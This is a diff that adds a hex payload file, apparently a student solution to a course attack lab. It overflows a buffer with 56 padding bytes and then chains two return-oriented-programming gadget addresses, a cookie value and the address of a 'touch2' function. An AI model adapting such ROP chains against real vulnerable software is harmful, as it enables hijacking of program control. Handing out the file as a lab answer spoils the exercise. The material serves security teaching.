@@ -1,0 +1,11 @@
+00 00 00 00 00 00 00 00 /* pad with 0x38 bytes = 56 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+71 18 40 00 00 00 00 00 /* address of gadget 1: popq %rax in little endian */
+d1 f3 3f 4f 00 00 00 00 /* my cookie */
+5d 18 40 00 00 00 00 00 /* address of gadget 2: move %rax to %rdi in little endian */
+f1 16 40 00 00 00 00 00 /* address of touch2 function in little endian */
